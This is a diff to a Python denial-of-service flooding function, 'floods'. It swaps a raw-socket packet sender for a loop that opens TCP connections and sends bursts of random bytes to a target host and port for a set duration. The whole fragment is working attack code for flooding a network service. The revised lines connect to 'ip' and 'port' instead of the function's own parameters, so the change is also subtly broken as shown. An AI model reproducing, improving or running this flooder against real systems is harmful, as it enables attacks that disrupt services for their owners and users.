@@ -10,9 +10,14 @@ def floods(target_host, target_port, duration):
     
     while time.time() - start_time < duration:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-            payload = os.urandom(10000)
-            s.sendto(payload, (target_host, target_port))
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            data = random._urandom(1010)
+            s.connect((ip,port))
+            s.send(data)
+            s.send(data)
+            s.send(data)
+            s.send(data)
         except Exception as e:
             print("Error:", e)
         finally:
